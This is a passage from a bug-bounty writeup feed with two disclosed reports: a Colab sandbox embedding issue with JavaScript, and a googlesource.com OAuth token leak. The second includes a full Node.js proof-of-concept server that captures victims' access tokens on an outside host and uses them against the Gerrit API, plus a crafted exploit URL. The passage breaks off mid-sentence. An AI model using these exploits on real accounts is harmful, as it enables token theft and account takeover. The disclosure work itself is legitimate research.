<feed xmlns="http://www.w3.org/2005/Atom">
<generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator>
<link href="https://ndevtk.github.io/writeups/feed.xml" rel="self" type="application/atom+xml"/>
<link href="https://ndevtk.github.io/writeups/" rel="alternate" type="text/html"/>
<updated>2023-07-21T12:08:05+00:00</updated>
<id>https://ndevtk.github.io/writeups/feed.xml</id>
<title type="html">Writeups</title>
<entry>
<title type="html">Insecure sandbox on Colaboratory (Awarded $1337, Not Fixed)</title>
<link href="https://ndevtk.github.io/writeups/2023/06/23/outputframes/" rel="alternate" type="text/html" title="Insecure sandbox on Colaboratory (Awarded $1337, Not Fixed)"/>
<published>2023-06-23T00:00:00+00:00</published>
<updated>2023-06-23T00:00:00+00:00</updated>
<id>https://ndevtk.github.io/writeups/2023/06/23/outputframes</id>
<content type="html" xml:base="https://ndevtk.github.io/writeups/2023/06/23/outputframes/"><p>Google Colaboratory puts some output such as visualizations into a sandbox however it has no embedding protection such as csp frame-ancestors so the origin is exposed to attackers with local network access.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">about:blank</span><span class="dl">'</span><span class="p">);</span> </code></pre></div></div> <p>On about:blank</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">opener</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://colab.research.google.com/</span><span class="dl">'</span><span class="p">;</span> </code></pre></div></div> <p>Leak ID from unencrypted DNS then do:</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">IDfromDNS</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">blah</span><span class="dl">'</span><span class="p">;</span> <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span> <span class="nx">f</span><span class="p">.</span><span class="nx">hidden</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span> <span class="nx">f</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://</span><span class="dl">'</span><span class="o">+</span><span class="nx">IDfromDNS</span><span class="o">+</span><span class="dl">'</span><span class="s1">-0-colab.googleusercontent.com/outputframe.html</span><span class="dl">'</span><span class="p">;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">_</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="nx">f</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">({</span><span class="na">sandboxed_iframe_evaluation</span><span class="p">:</span> <span class="dl">'</span><span class="s1">console.log(parent.opener[0].google)</span><span class="dl">'</span><span class="p">},</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">);</span> <span class="p">},</span> <span class="mi">100</span><span class="p">);</span> </code></pre></div></div> <p>On the “Welcome to Colaboratory” project using the sandbox embedded on the attackers website.</p> <ul> <li><code class="language-plaintext highlighter-rouge">parent.opener[0].google</code> refers to stuff.</li> <li><code class="language-plaintext highlighter-rouge">parent.opener[5].document</code> refers to the chart.</li> </ul> <p>Sometimes sandboxes use a randomly generated subdomain for isolation unfortunately due to unencrypted DNS this is not safe. <a href="https://www.cloudflare.com/learning/dns/dns-over-tls/">https://www.cloudflare.com/learning/dns/dns-over-tls/</a></p></content>
<author>
<name/>
</author>
<summary type="html">Google Colaboratory puts some output such as visualizations into a sandbox however it has no embedding protection such as csp frame-ancestors so the origin is exposed to attackers with local network access.</summary>
</entry>
<entry>
<title type="html">googlesource.com access_token leak (Awarded $7500)</title>
<link href="https://ndevtk.github.io/writeups/2023/06/11/googlesource/" rel="alternate" type="text/html" title="googlesource.com access_token leak (Awarded $7500)"/>
<published>2023-06-11T00:00:00+00:00</published>
<updated>2023-06-11T00:00:00+00:00</updated>
<id>https://ndevtk.github.io/writeups/2023/06/11/googlesource</id>
<content type="html" xml:base="https://ndevtk.github.io/writeups/2023/06/11/googlesource/"><p>A bug in the <a href="https://source.android.com/docs/setup/contribute/source-editor">Git Source Editor</a>, the official browser-based tool by Google for editing files in projects such as <a href="https://edit.chromium.org/edit">Chromium</a> and <a href="https://ci.android.com/edit">Android</a>, allowed to leak the user’s OAuth token by redirecting to an attacker-controlled URL supplied in the URL parameters.</p> <p>Target: <em>Applications that permits taking over a Google account</em><br /> Category: <em>Execute code on the client</em></p> <p>The following regex was used to validate the redirect URLs. Normally, the URL would be restricted to <code class="language-plaintext highlighter-rouge">*.googlesource.com</code> or <code class="language-plaintext highlighter-rouge">*.git.corp.google.com</code>.<br /> The regex, however, did not correctly validate the URLs, causing <code class="language-plaintext highlighter-rouge">https://android.googlesource.com/aogarantiza.com:1337#.googlesource.com/platform/build/+show/refs/heads/master/Changes.md</code> to send a request to <code class="language-plaintext highlighter-rouge">https://aogarantiza.com:1337</code>, instead of <code class="language-plaintext highlighter-rouge">https://android.googlesource.com</code>, This made it possible to leak the <code class="language-plaintext highlighter-rouge">access_token</code> to the attacker.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">L1</span><span class="p">.</span><span class="nx">GERRIT_LINK_MATCHER</span> <span class="o">=</span> <span class="sr">/</span><span class="se">(</span><span class="sr">.*</span><span class="se">\/)?(</span><span class="sr">.*</span><span class="se">?)\.((</span><span class="sr">googlesource</span><span class="se">\.</span><span class="sr">com</span><span class="se">)</span><span class="sr">|</span><span class="se">(</span><span class="sr">git</span><span class="se">\.</span><span class="sr">corp</span><span class="se">\.</span><span class="sr">google</span><span class="se">\.</span><span class="sr">com</span><span class="se">))\/(</span><span class="sr">.*</span><span class="se">)\/\+([</span><span class="sr">a-zA-Z0-9</span><span class="se">]</span><span class="sr">+</span><span class="se">)?(\/</span><span class="sr">refs</span><span class="se">\/</span><span class="sr">heads</span><span class="se">)?\/(</span><span class="sr">.*</span><span class="se">?)[\/</span><span class="sr">^</span><span class="se">](</span><span class="sr">.*</span><span class="se">)</span><span class="sr">/</span><span class="p">;</span> <span class="nx">L1</span><span class="p">.</span><span class="nx">GERRIT_LINK_MATCHER_FOR_CHANGE_FILE</span> <span class="o">=</span> <span class="sr">/</span><span class="se">(</span><span class="sr">.*</span><span class="se">\/)?(</span><span class="sr">.*</span><span class="se">?)\.((</span><span class="sr">googlesource</span><span class="se">\.</span><span class="sr">com</span><span class="se">)</span><span class="sr">|</span><span class="se">(</span><span class="sr">git</span><span class="se">\.</span><span class="sr">corp</span><span class="se">\.</span><span class="sr">google</span><span class="se">\.</span><span class="sr">com</span><span class="se">))\/?(\/</span><span class="sr">c</span><span class="se">)?\/(</span><span class="sr">.*</span><span class="se">)\/\+\/([</span><span class="sr">0-9</span><span class="se">]</span><span class="sr">+</span><span class="se">)\/([</span><span class="sr">0-9</span><span class="se">]</span><span class="sr">+</span><span class="se">)\/(</span><span class="sr">.*</span><span class="se">)</span><span class="sr">/</span><span class="p">;</span> <span class="nx">L1</span><span class="p">.</span><span class="nx">GERRIT_LINK_MATCHER_FOR_CHANGE_FILE_IN_GITLES</span> <span class="o">=</span> <span class="sr">/</span><span class="se">(</span><span class="sr">.*</span><span class="se">\/)?(</span><span class="sr">.*</span><span class="se">?)\.((</span><span class="sr">googlesource</span><span class="se">\.</span><span class="sr">com</span><span class="se">)</span><span class="sr">|</span><span class="se">(</span><span class="sr">git</span><span class="se">\.</span><span class="sr">corp</span><span class="se">\.</span><span class="sr">google</span><span class="se">\.</span><span class="sr">com</span><span class="se">))\/(</span><span class="sr">.*</span><span class="se">)\/\+([</span><span class="sr">a-zA-Z0-9</span><span class="se">]</span><span class="sr">+</span><span class="se">)?(\/</span><span class="sr">refs</span><span class="se">\/</span><span class="sr">changes</span><span class="se">)?\/([</span><span class="sr">0-9</span><span class="se">]</span><span class="sr">+</span><span class="se">)\/([</span><span class="sr">0-9</span><span class="se">]</span><span class="sr">+</span><span class="se">)\/([</span><span class="sr">0-9</span><span class="se">]</span><span class="sr">+</span><span class="se">)[\/</span><span class="sr">^</span><span class="se">](</span><span class="sr">.*</span><span class="se">)</span><span class="sr">/</span><span class="p">;</span> <span class="kd">function</span> <span class="nx">Z1</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Cra</span><span class="p">.</span><span class="nx">some</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">g</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="kc">null</span> <span class="o">!=</span> <span class="nx">g</span><span class="p">.</span><span class="nx">exec</span><span class="p">((</span><span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">a</span><span class="p">)).</span><span class="nx">origin</span><span class="p">)</span> <span class="p">}))</span> <span class="k">throw</span> <span class="nb">Error</span><span class="p">(</span><span class="dl">"</span><span class="s2">Invalid host domain passed </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">a</span><span class="p">);</span> <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">L1</span><span class="p">.</span><span class="nx">GERRIT_LINK_MATCHER</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">,</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">Dra</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nx">f</span><span class="p">)</span> <span class="k">return</span> <span class="p">{</span> <span class="na">host</span><span class="p">:</span> <span class="nx">f</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="na">project</span><span class="p">:</span> <span class="nx">f</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="na">branch</span><span class="p">:</span> <span class="nx">f</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span> <span class="na">file</span><span class="p">:</span> <span class="nx">f</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="p">};</span> <span class="k">if</span> <span class="p">(</span><span class="nx">d</span><span class="p">)</span> <span class="k">return</span> <span class="p">{</span> <span class="na">host</span><span class="p">:</span> <span class="nx">d</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="na">project</span><span class="p">:</span> <span class="nx">d</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="na">branch</span><span class="p">:</span> <span class="nx">d</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span> <span class="na">file</span><span class="p">:</span> <span class="nx">d</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="p">};</span> <span class="k">throw</span> <span class="nb">Error</span><span class="p">(</span><span class="dl">"</span><span class="s2">Unable to parse change pieces.</span><span class="dl">"</span><span class="p">);</span> <span class="p">}</span> </code></pre></div></div> <h1 id="the-report-">The report :)</h1> <p>Automatically assigned P2 by “google magic”, later given S2 after human review.</p> <p>server.js</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">http</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">http</span><span class="dl">'</span><span class="p">);</span> <span class="kd">const</span> <span class="nx">https</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">https</span><span class="dl">"</span><span class="p">);</span> <span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">);</span> <span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span> <span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">1338</span><span class="p">;</span> <span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="k">try</span> <span class="p">{</span> <span class="c1">// Use this to avoid an error modal about Gerrit account missing.</span> <span class="c1">// We could leave modal to distract from the main error that shows the attacker URL.</span> <span class="c1">// Attacker URL could also be obscured further.</span> <span class="nx">console</span><span class="p">.</span><span class="nx">info</span><span class="p">(</span><span class="dl">'</span><span class="s1">Request origin:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span> <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Access-Control-Allow-Origin</span><span class="dl">'</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span> <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Access-Control-Allow-Credentials</span><span class="dl">'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span> <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> <span class="nx">console</span><span class="p">.</span><span class="nx">info</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error</span><span class="dl">'</span><span class="p">);</span> <span class="p">}</span> <span class="nx">res</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span> <span class="c1">// Emulate a file listing (optional but errors look bad)</span> <span class="kd">const</span> <span class="nx">dirResponse</span> <span class="o">=</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">b939af01ca07f0caa68fb8d264a68b91e86efe70</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">entries</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span> <span class="mi">33188</span><span class="p">,</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">blob</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">54c90ede642a93580a98eb4ed6e821749b04a989</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">.gitignore</span><span class="dl">"</span> <span class="p">},</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span> <span class="mi">33188</span><span class="p">,</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">blob</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">daebd5231a3ec9aafd58e6f4075f3b63e4c3bd53</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Changes.md</span><span class="dl">"</span> <span class="p">},</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span> <span class="mi">33188</span><span class="p">,</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">blob</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">957da92f63926bf6013845f0ff0602d1f1620e0a</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">CleanSpec.mk</span><span class="dl">"</span> <span class="p">},</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span> <span class="mi">33188</span><span class="p">,</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">blob</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">74b54fadd522b739407d7d71b4ea3503fc666aeb</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Deprecation.md</span><span class="dl">"</span> <span class="p">},</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span> <span class="mi">33188</span><span class="p">,</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">blob</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">44781a70880412fdd9007cc2bec16a4b09924c6d</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">METADATA</span><span class="dl">"</span> <span class="p">},</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span> <span class="mi">33188</span><span class="p">,</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">blob</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">97fda40f7b2006ae5f6bc895a4a1d602ceb991c6</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">OWNERS</span><span class="dl">"</span> <span class="p">},</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span> <span class="mi">33188</span><span class="p">,</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">blob</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ce7515044e84d15868077c0a8319fc401442fc4d</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">PREUPLOAD.cfg</span><span class="dl">"</span> <span class="p">},</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span> <span class="mi">33188</span><span class="p">,</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">blob</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">47809a95ac45ec11840166adac5eb31d3ed9c788</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">README.md</span><span class="dl">"</span> <span class="p">},</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span> <span class="mi">33188</span><span class="p">,</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">blob</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ea4788a1bc26b698697f9a1499cd2164e0d03d3d</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Usage.txt</span><span class="dl">"</span> <span class="p">},</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span> <span class="mi">33188</span><span class="p">,</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">blob</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">b31578a29b5c64e4fa690b8f4062e045ba01185a</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">buildspec.mk.default</span><span class="dl">"</span> <span class="p">},</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span> <span class="mi">16384</span><span class="p">,</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">tree</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">9a970257168359bda2226ac81dd945e41a3db224</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">common</span><span class="dl">"</span> <span class="p">},</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span> <span class="mi">33188</span><span class="p">,</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">blob</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">004788a1bc26b698697f9a1499cd2164e0d03d3d</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">HELLO_FROM_AO.txt</span><span class="dl">"</span> <span class="p">},</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span> <span class="mi">33188</span><span class="p">,</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">blob</span><span class="dl">"</span><span class="p">,</span> <span class="c1">// Type param will be injected as CSS class in an element, but this is of limited use</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">00970257168359bda2226ac81dd945e41a3db224</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">HELLO_FROM_AO_SERVER</span><span class="dl">"</span> <span class="c1">// Will be added as text</span> <span class="p">},</span> <span class="p">]</span> <span class="p">};</span> <span class="kd">const</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">).</span><span class="nx">query</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nx">query</span><span class="p">?.</span><span class="nx">format</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">JSON</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span> <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="dl">"</span><span class="s2">)]}'</span><span class="dl">"</span><span class="o">+</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">dirResponse</span><span class="p">));</span> <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">query</span><span class="p">?.</span><span class="nx">format</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">TEXT</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span> <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="dl">"</span><span class="s2">TEXT RESPONSE</span><span class="dl">"</span><span class="p">);</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="dl">'</span><span class="s1">Hello World</span><span class="dl">'</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">query</span><span class="p">.</span><span class="nx">access_token</span><span class="p">)</span> <span class="k">return</span> <span class="kd">const</span> <span class="nx">payloadTimestamp</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span> <span class="c1">// const payload = ' { "display_name": "PoC display name! Set on '+payloadTimestamp+'" }';</span> <span class="kd">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="dl">'</span><span class="s1"> { "status": "Hello from PoC by NDevTK. This field was set on </span><span class="dl">'</span><span class="o">+</span><span class="nx">payloadTimestamp</span><span class="o">+</span><span class="dl">'</span><span class="s1"> by PoC script hosted on Alesandro Ortiz</span><span class="se">\'</span><span class="s1">s server." }</span><span class="dl">'</span><span class="p">;</span> <span class="kd">const</span> <span class="nx">options</span> <span class="o">=</span> <span class="p">{</span> <span class="na">hostname</span><span class="p">:</span> <span class="dl">'</span><span class="s1">chromium-review.googlesource.com</span><span class="dl">'</span><span class="p">,</span> <span class="na">port</span><span class="p">:</span> <span class="mi">443</span><span class="p">,</span> <span class="na">path</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/a/accounts/self/status?access_token=</span><span class="dl">'</span><span class="o">+</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">query</span><span class="p">.</span><span class="nx">access_token</span><span class="p">),</span> <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">PUT</span><span class="dl">'</span><span class="p">,</span> <span class="na">headers</span><span class="p">:</span> <span class="p">{</span> <span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Content-Length</span><span class="dl">'</span><span class="p">:</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">length</span> <span class="p">}</span> <span class="p">}</span> <span class="kd">const</span> <span class="nx">api</span> <span class="o">=</span> <span class="nx">https</span><span class="p">.</span><span class="nx">request</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{});</span> <span class="nx">api</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">payload</span><span class="p">);</span> <span class="nx">api</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span> <span class="p">};</span> <span class="nx">https</span><span class="p">.</span><span class="nx">createServer</span><span class="p">({</span> <span class="na">key</span><span class="p">:</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">privkey.pem</span><span class="dl">'</span><span class="p">),</span> <span class="na">cert</span><span class="p">:</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">fullchain.pem</span><span class="dl">'</span><span class="p">)</span> <span class="p">},</span> <span class="nx">app</span><span class="p">).</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`Server running on port </span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span> <span class="p">});</span> </code></pre></div></div> <p>This uses Chromium’s <a href="https://gerrit-review.googlesource.com/Documentation/rest-api.html">Gerrit Code Review REST API</a>.</p> <h1 id="attack-scenario">Attack scenario</h1> <p>Attackers can steal chromium.org OAuth access token from any user who visits a specially crafted URL.<br /> If a user has previously authorized the “Android Build Team” OAuth app [1], only visiting the URL is required. If a user has not previously authorized the OAuth app, the user will see a legitimate Google OAuth prompt for the app, and the user only needs to grant access to the legit OAuth app. There are no other preconditions.</p> <h1 id="reproduction-case">Reproduction case:</h1> <p>PoC URL 1, sends creds to PoC server on <code class="language-plaintext highlighter-rouge">https://aogarantiza.com:1338</code> (loads legitimate file and also spoofs directory listing): <code class="language-plaintext highlighter-rouge">https://edit.chromium.org/edit?repo=android/platform/build/&amp;file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%3Fhttps%3A%2F%2Faogarantiza.com%3A1338%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2F</code></p> <p>PoC URL 1 loads a file from a *.googlesource.com repo and populates the directory listing with attacker-controlled content (seems limited to text via <code class="language-plaintext highlighter-rouge">name</code> and a CSS class injection via <code class="language-plaintext highlighter-rouge">type</code>).</p> <p>Same as PoC URL 1 but with additional dummy params to obscure suspicious param in address bar: <code class="language-plaintext 